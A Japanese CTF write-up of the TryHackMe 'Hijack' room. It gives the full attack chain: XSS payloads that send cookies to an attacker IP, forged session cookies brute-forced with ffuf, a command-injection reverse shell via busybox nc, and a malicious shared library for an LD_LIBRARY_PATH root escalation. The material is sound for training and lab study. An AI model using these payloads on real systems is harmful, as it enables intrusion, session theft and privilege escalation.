# Hijack CTF

https://tryhackme.com/room/hijack

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.160.235
root@ip-10-10-215-87:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-09 10:50 GMT
Nmap scan report for 10.10.160.235
Host is up (0.00043s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
34838/tcp open  unknown
35366/tcp open  unknown
37259/tcp open  unknown
47037/tcp open  unknown
MAC Address: 02:64:61:78:BD:6D (Unknown)

root@ip-10-10-215-87:~# sudo nmap -sV -p21,22,80,111,2049,34838,35366,37259,47037 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-09 10:53 GMT
Nmap scan report for 10.10.160.235
Host is up (0.00037s latency).

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs_acl  2-3 (RPC #100227)
34838/tcp open  mountd   1-3 (RPC #100005)
35366/tcp open  nlockmgr 1-4 (RPC #100021)
37259/tcp open  mountd   1-3 (RPC #100005)
47037/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 02:64:61:78:BD:6D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
```

FTP, SSH, HTTP, 

### gobuster

```shell
root@ip-10-10-215-87:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.160.235
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/login.php            (Status: 200) [Size: 822]
/signup.php           (Status: 200) [Size: 1002]
/index.php            (Status: 200) [Size: 487]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
/administration.php   (Status: 200) [Size: 51]
/navbar.php           (Status: 200) [Size: 304]
/server-status        (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

### /login.php

- 存在しないユーザー名を入れると「No account found with that username.」と表示される
- ユーザー名に admin を入れると、「The password you entered is not valid.」と表示されるのでadminユーザーは存在する。
- PHPSESSIDはあるが、CSRFトークンはない

/signup.php で thm ユーザーを登録してログインすると、/index.php で「Welcome thm」と表示される。

```
PHPSESSID=dGhtOmU4MGI1MDE3MDk4OTUwZmM1OGFhZDgzYzhjMTQ5Nzhl
```

セッションIDをBase64デコードすると、ユーザー名が含まれている。

```shell
thm:e80b5017098950fc58aad83c8c14978e
```

ユーザー名をadminにしてBase64エンコードしてみる
```shell
$ echo admin:e80b5017098950fc58aad83c8c14978e | base64             
YWRtaW46ZTgwYjUwMTcwOTg5NTBmYzU4YWFkODNjOGMxNDk3OGUK
```

「Welcome Guest」と表示される。ログインしていない場合と同じ。

e80b5017098950fc58aad83c8c14978e の部分は、パスワード「abcdef」のMD5ハッシュだった。

ログイン5回失敗すると300秒ロックされるので、ブルートフォースは難しい。

### ユーザー登録

登録したユーザー名が画面表示されるので、テンプレートインジェクションを試したが、そのまま表示されるので効果ないと思われる。

```txt
{{7*'7'}}
{'Hello'|upper}
```

XSSを試したらアラートダイアログが表示されたので、XSSの脆弱性はある。

```js
<script>alert('hello');</script>
```

登録したユーザー名が管理画面で表示されることを期待してセッションクッキーを盗むXSSを仕掛けてみる。

```js
<script>fetch('http://10.2.22.182:8000?cookie=' + btoa(document.cookie) );</script>

<script>document.write('<img src="http://10.2.22.182:6666/' + document.cookie + '">')</script>
```

登録できるが、ログインできない。正確に言うと、セッションIDは付与されているが、index.php でゲスト表示される。セッションIDをデコードするとユーザー名が途中で切れているので、長すぎるかもしれない。

```text
<script>fetch('http://10.2.22.182:8000%2FY29va2llPScgKyBidG9hKGRvY3VtZW50LmNvb2tpZSkgKTs8L3NjcmlwdD46ZTgwYjUwMTcwOTg5NTBmYzU4YWFkODNjOGMxNDk3OGU%3D
```

### NFS 

```shell
$ showmount -e 10.10.59.164
Export list for 10.10.59.164:
/mnt/share *
```

マウント可能。

```shell
$ sudo mount -t nfs 10.10.59.164:/mnt/share /mnt
      
$ ls -al        
drwx------  2 1003 1003 4096 Aug  8  2023 mnt
```
マウントできるが、UID：1003 のみアクセスできる。

UID 1003 ユーザーをローカルに作る。

```shell
kali:x:1000:1000:,,,:/home/kali:/usr/bin/zsh
kali_1001:x:1001:1001:,,,:/home/kali_1001:/bin/bash
kali_1002:x:1002:1002:,,,:/home/kali_1002:/bin/bash
kali_1003:x:1003:1003:,,,:/home/kali_1003:/bin/bash
```

```shell
$ ls -al /mnt                                                                                                     
total 12
drwx------  2 kali_1003 kali_1003 4096 Aug  8  2023 .
drwxr-xr-x 18 root      root      4096 Aug 18 17:47 ..
-rwx------  1 kali_1003 kali_1003   46 Aug  8  2023 for_employees.txt

┌──(kali_1003㉿kali)-[~]
└─$ cat /mnt/for_employees.txt                                                                                      
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```

FTPユーザーの接続情報が出てきた。

### FTP
```shell
$ ftp 10.10.59.164
Connected to 10.10.59.164.
220 (vsFTPd 3.0.3)
Name (10.10.59.164:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
229 Entering Extended Passive Mode (|||47026|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
226 Directory send OK.
```

```shell
$ wget -r --user="ftpuser" --password="W3stV1rg1n14M0un741nM4m4" ftp://10.10.59.164/

$ ls -al ./10.10.59.164           
total 28
drwxrwxr-x 2 kali kali 4096 Feb  9 21:38 .
drwxrw-rw- 3 kali kali 4096 Feb  9 21:38 ..
-rw-rw-r-- 1 kali kali  220 Aug  8  2023 .bash_logout
-rw-rw-r-- 1 kali kali 3771 Aug  8  2023 .bashrc
-rw-rw-r-- 1 kali kali  368 Aug  8  2023 .from_admin.txt
-rw-rw-r-- 1 kali kali 3150 Aug  8  2023 .passwords_list.txt
-rw-rw-r-- 1 kali kali  655 Aug  8  2023 .profile
```

```shell
$ cat ./10.10.59.164/.from_admin.txt    
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

```shell
$ head ./10.10.59.164/.passwords_list.txt 
Vxb38mSNN8wxqHxv6uMX
56J4Zw6cvz8qDvhCWCVy
qLnqTXydnY3ktstntLGu
N63nPUxDG2ZvrhZgP978
jw3Ezr26tygTdgBZVYGr
zb9CFkd2QGDBjgyVvfDH
kfFpLAQFhD3S6TvYn4mv
nYyn4JxPhjSsm4HUeGtK
yGWCg6GNePUFZzV8f2gP
LFK43GAfc8JeVpCGCXzM
```
リストは150行ある。

5回失敗で5分ロックされるので、5分×30回で2時間半、実際は3時間はかかる計算。それはやりたくない。

「admin:パスワードMD5ハッシュ」 がセッションIDなので、150個セッションIDを作り、Hydraか何かでindex.phpをGETし、応答に「Guest」が含まれているかどうかを見れば判定できるはず。

パスワードリストからMD5リストを生成

```shell
while IFS= read -r line; do 
    echo -n "$line" | md5sum | awk '{print $1}'
done < pwlist.txt > md5list.txt
```

セッションIDリスト生成。改行が含まれていたことでしばらく嵌った。

```shell
while IFS= read -r line; do 
    echo "admin:$line" | tr -d '\n' | base64
done < md5list.txt > SESSIDs.txt
```

```shell
$ ffuf -w SESSIDs.txt:W1 -X GET \
-u http://10.10.3.153/index.php \           
-H "Cookie: PHPSESSID=W1" \     
-H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0" \
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
-H "Accept-Language: en-US,en;q=0.5" \
-H "Accept-Encoding: gzip, deflate" \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "Upgrade-Insecure-Requests: 1" \
-fr "Guest"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.3.153/index.php
 :: Wordlist         : W1: /home/kali/CTF/SESSIDs.txt
 :: Header           : Cookie: PHPSESSID=W1
 :: Header           : User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Guest
________________________________________________

YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU= [Status: 200, Size: 435, Words: 97, Lines: 20, Duration: 274ms]
:: Progress: [150/150] :: Job [1/1] :: 31 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

セッションID:YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=　を設定して、/administration.php を表示成功。

## /administration.php

サービス名を入力して、その状態を表示する画面。

```text
`whoami`
```
を入力すると下記が返ってきた。

```text
* www-data.service
   Loaded: not-found (Reason: No such file or directory)
   Active: inactive (dead)
```

シンプルにリバースシェルを実行。

```text
`rm /tmp/f; mkfifo /tmp/f; nc 10.2.22.182 6666 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
```

コマンドインジェクションが検出された。

```text
Command injection detected, please provide a service.
```

様々試した結果、下記で成功した。
```shell
$(busybox nc 10.2.22.182 6666 -e sh)
```

```shell
$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.3.153] 53506
whoami
www-data
```

```shell
ls -al /home
total 16
drwxr-xr-x    4 root     root          4096 Aug  8  2023 .
drwxr-xr-x   23 root     root          4096 Feb 10 07:00 ..
drwxr-xr-x    2 ftpuser  ftpuser       4096 Aug  8  2023 ftpuser
drwxr-xr-x    2 rick     rick          4096 Aug  8  2023 rick
ls -al /home/rick
total 12
drwxr-xr-x    2 rick     rick          4096 Aug  8  2023 .
drwxr-xr-x    4 root     root          4096 Aug  8  2023 ..
lrwxrwxrwx    1 root     root             9 Aug  8  2023 .bash_history -> /dev/null
lrwxrwxrwx    1 root     root             9 Aug  8  2023 .mysql_history -> /dev/null
-rw-------    1 rick     rick            38 Aug  8  2023 user.txt
```
rick になる必要がある。

## 権限昇格１

rickの所有ファイル
```shell
find / -user rick -type f 2>/dev/null
/home/rick/user.txt
```

WEBのファイルを確認

```shell
pwd
/var/www/html
ls -al
total 48
drwxr-xr-x    2 www-data www-data      4096 Aug  8  2023 .
drwxr-xr-x    3 root     root          4096 Aug  8  2023 ..
-rw-rw-r--    1 www-data www-data      2062 Jul 12  2023 administration.php
-rw-rw-r--    1 www-data www-data       307 Jun 23  2023 config.php
-rw-rw-r--    1 www-data www-data      1272 Jul 12  2023 index.php
-rw-rw-r--    1 www-data www-data      5957 Jul 12  2023 login.php
-rw-rw-r--    1 www-data www-data       220 Jun 23  2023 logout.php
-rw-rw-r--    1 www-data www-data       440 Jun 23  2023 navbar.php
-rw-rw-r--    1 www-data www-data        88 Jun 23  2023 service_status.sh
-rw-rw-r--    1 www-data www-data      3066 Jun 23  2023 signup.php
-rw-rw-r--    1 www-data www-data      1916 Jun 23  2023 style.css
cat config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```

rickのDB用の接続情報を発見。このパスワードでSSH接続できた。

```shell
$ cat user.txt
THM{fdc........}
```

## 権限昇格２

### SUID

```shell
$ find / -perm -u=s -type f -ls 2>/dev/null
    29894    420 -rwsr-xr-x   1 root     root       428240 May 26  2020 /usr/lib/openssh/ssh-keysign
    29492     16 -rwsr-xr-x   1 root     root        14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
    29906    112 -rwsr-xr-x   1 root     root       110792 Feb  8  2021 /usr/lib/snapd/snap-confine
    29455     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
    29585     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    26259     84 -rwsr-xr-x   1 root     root          84120 Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    24724     52 -rwsr-sr-x   1 daemon   daemon        51464 Jan 14  2016 /usr/bin/at
    24607     36 -rwsr-xr-x   1 root     root          32944 Mar 26  2019 /usr/bin/newgidmap
    24380     72 -rwsr-xr-x   1 root     root          71824 Mar 26  2019 /usr/bin/chfn
    24384     40 -rwsr-xr-x   1 root     root          40432 Mar 26  2019 /usr/bin/chsh
    24289     40 -rwsr-xr-x   1 root     root          39904 Mar 26  2019 /usr/bin/newgrp
    24381     56 -rwsr-xr-x   1 root     root          54256 Mar 26  2019 /usr/bin/passwd
    24385    136 -rwsr-xr-x   1 root     root         136808 Jan 20  2021 /usr/bin/sudo
    24382     76 -rwsr-xr-x   1 root     root          75304 Mar 26  2019 /usr/bin/gpasswd
    24608     36 -rwsr-xr-x   1 root     root          32944 Mar 26  2019 /usr/bin/newuidmap
    59433     96 -rwsr-xr-x   1 root     root          94240 Jun  9  2020 /sbin/mount.nfs
      120     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
      154     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
      108     28 -rwsr-xr-x   1 root     root          27608 Jan 27  2020 /bin/umount
       97     40 -rwsr-xr-x   1 root     root          40128 Mar 26  2019 /bin/su
      107     40 -rwsr-xr-x   1 root     root          40152 Jan 27  2020 /bin/mount
      119     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
```

### sudo
```shell
$ sudo -l
[sudo] password for rick: 
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

```shell
$ systemctl cat apache2
# /run/systemd/generator.late/apache2.service
# Automatically generated by systemd-sysv-generator

[Unit]
Documentation=man:systemd-sysv-generator(8)
SourcePath=/etc/init.d/apache2
Description=LSB: Apache2 web server
Before=multi-user.target
Before=multi-user.target
Before=multi-user.target
Before=graphical.target
Before=shutdown.target
After=local-fs.target
After=remote-fs.target
After=network-online.target
After=systemd-journald-dev-log.socket
After=nss-lookup.target
Wants=network-online.target
Conflicts=shutdown.target

[Service]
Type=forking
Restart=no
TimeoutSec=5min
IgnoreSIGPIPE=no
KillMode=process
GuessMainPID=no
RemainAfterExit=yes
ExecStart=/etc/init.d/apache2 start
ExecStop=/etc/init.d/apache2 stop
ExecReload=/etc/init.d/apache2 reload

# /lib/systemd/system/apache2.service.d/apache2-systemd.conf
[Service]
Type=forking
RemainAfterExit=no
```

```shell
root@Hijack:~/so# ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007ffcff9b1000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f8ad3812000)
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f8ad35eb000)
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f8ad33b9000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f8ad319c000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8ad2dd2000)
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f8ad2b9a000)
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f8ad2971000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f8ad276c000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f8ad2568000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f8ad3d27000)
```

- ロードしているsoと同名のsoファイルを作る（ロード時に自動的にbashを起動する）
- LD_LIBRARY_PATH=/tmp を設定し、soを読み込ませる
- sudo で apache2を実行する

でrootシェルをとれるはず。

### so作成
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```shell
gcc -shared -o /tmp/libcrypt.so.1 -fPIC evil.c
```

warningは出るがビルドできている。

### エクスプロイト

```shell
$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
[sudo] password for rick: 
/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
root@Hijack:~/so#
```
ルートシェル取得

```shell
root@Hijack:~/so# ls /root
root.txt
root@Hijack:~/so# cat /root/root.txt

██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{b91.....}
```
ルートフラグゲット

## 振り返り
- ftp で ls -a を使えることを初めて知った。
- base64 エンコードするときは、改行が含まれないよう慎重に。
- busyboxを初めて知った
